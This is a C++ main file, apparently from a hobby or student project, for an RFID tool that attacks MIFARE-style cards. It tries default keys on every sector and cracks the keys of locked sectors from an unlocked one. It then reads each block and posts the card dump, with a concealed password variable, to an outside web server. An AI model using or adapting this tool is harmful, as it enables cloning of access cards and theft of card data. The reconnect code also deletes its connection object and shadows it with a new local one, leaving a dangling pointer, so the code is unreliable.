/*02-04-17*****************************************************************************************************
***************************************************************************************************************
**                                                                                                           **
**                                                 main.cpp                                                  **
**                                                                                                           **
***************************************************************************************************************
**************************************************************************************************************/

/*#############################################################################################################

Section:                                          ~libs

#############################################################################################################*/

#include <iostream>
#include <string>
#include <sstream>
#include <unistd.h>


#include "RFID/MFrec.h"
#include "LCD/hdmiLCD.h"
#include "network/httpPostMaker.h"
#include "keywords.h"

/*#############################################################################################################

Section:                                          ~forward declarations

#############################################################################################################*/

void sendSector( MFrec *rfid, int sector, HttpPostMaker *post, bool locked );

/*#############################################################################################################

Section:                                          ~main

#############################################################################################################*/

int main()
{
    /*-------------------------------------- setup LCD  ---------------------------------------*/

    HdmiLCD lcd( 0x27 );
    lcd.init();
    lcd.clear();
    
    /*-------------------------------------- setup network COM ---------------------------------------*/

    std::string serverName = "folk.ntnu.no";
    std::string domain = "/haakonhy/php/requestHandling.php";
    
    auto post = new HttpPostMaker( &serverName, 80, STREAM, domain ); 
    

    if( post->connect()<=0  )
    {
	std::cerr << "no clientSocket\n";
	lcd.print( "Failed connection", 0, 0 );
	return -1;
    }
    /*-------------------------------------- try default keys  ---------------------------------------*/

    MFrec rfid;

    lcd.print( "Ready..", 0, 0 );

    rfid.initCom();// blocking


    int lockedSectors[16];
    int nrOfLockedSectors = 0;
    int exploitSector = 0;

   
    for( int sector = 0; sector<16; sector++)
    {
	
	if( !rfid.authenticateOnChip( AUTHENT_A, sector*4 ) )// takes blockAddr, not sector..
	{
	    lockedSectors[ nrOfLockedSectors++ ] = sector;
	    sendSector( &rfid, sector, post, true );

	    rfid.stop();
	    rfid.initCom();
	     

	}
	else
	{
	    exploitSector = sector;
	    sendSector( &rfid, sector, post, false );
	}

    }// for each sector

    if( nrOfLockedSectors>15 )
    {
	lcd.print( "No default", 0,0 );
	std::cout << "No sectors use a default key\n";
	return 0;
    }

    /*-------------------------------------- recover the locked sectors  ---------------------------------------*/
    
    int nrOfRecoveredKeys = 0;

    lcd.clear();
    lcd.print( "Recovery", 0, 4 );
    for( int sector = 0; sector<nrOfLockedSectors; sector++ )
    {
	lcd.print( "Sector " + std::to_string( lockedSectors[sector] ), 1, 4 );

	rfid.stop();
	
	if( rfid.crackKey( AUTHENT_A, exploitSector*4, lockedSectors[sector]*4 ) )
	{
	    nrOfRecoveredKeys++;
	    if( !post->isConnected() )
	    {
		delete post;
		auto post = new HttpPostMaker( &serverName, 80, STREAM, domain );
		if( post->connect()<=0  )
		{
		    std::cerr << "no clientSocket\n";
		    lcd.print( "Failed connection", 0, 0 );
		    return -1;
		}
	    }
	    
	    rfid.initCom();
	    sendSector( &rfid, lockedSectors[sector], post, false );// class has now updated the key
	}
    }

    std::cout << "Nr of recovered keys: " << nrOfRecoveredKeys << std::endl;

    lcd.clear();
    lcd.print( "Keys recovered: ", 0,0 );
    lcd.print( std::to_string( nrOfRecoveredKeys ), 1, 7 );

    
    return 0;

}


/*=============================================================================================================

NAME:                                             ~sendSector
ARGUMENT(S):
DESCRIPTION: read a sector from RFID card and sends it to server
RETURN:

==============================================================================================================*/
void sendSector( MFrec *rfid, int sector, HttpPostMaker *post, bool locked )
{
    unsigned char block[18];
    std::stringstream ss;
    char buffer[4096];

    for( int blk = 0; blk<4; blk++ )
    {
	
	// reset block
	for( int i = 0; i<16; i++) block[i] = 'X';

	
	if( !locked )
	{
	    if(!rfid->readBlock( (sector*4) + blk, block, 18 ) )// 16 data bytes + 2 checksum bytes
	       locked=true;
	}
	/* POST variables are hidden since this is public */
	post->addToBody( var1 + "=" + std::to_string( (sector*4)+blk ) );
      
	
	// convert to ascii if possible
	std::string asciiRep="";
	    
	for( int i = 1; i<=16; i++ )
	{
	    if( !locked )
	    {
		ss << var2 << i << "=" << std::hex << (int)block[i-1] << std::dec;
		post->addToBody( ss.str() );
		ss.str("");// clear stream

		if( block[i-1] >=32 && block[i-1]<127 )// readable char
		{
		    asciiRep += (char)block[i-1];
		}
		else
		{
		    asciiRep += ".";
		}
	    }//if !locked
	    else
	    {
		post->addToBody( var2 + std::to_string(i) + "=" + (char)block[i-1] );// write X'es
	    }
		
        
	}// for each byte

	if( !locked )
	{
	    post->addToBody( var3 + "=" + asciiRep );
	}
	else
	{
	    post->addToBody( var3 + "=LOCKED" );
	}

	post->addToBody( var4 + "=" + password );
   
	post->sendPOST();
	int len = post->receive( buffer, 4096 );
	for( int c = 0; c<len; c++ )
	    std::cout << buffer[c];
	std::cout << std::endl;
	usleep(10);
    }// for each block

}


    
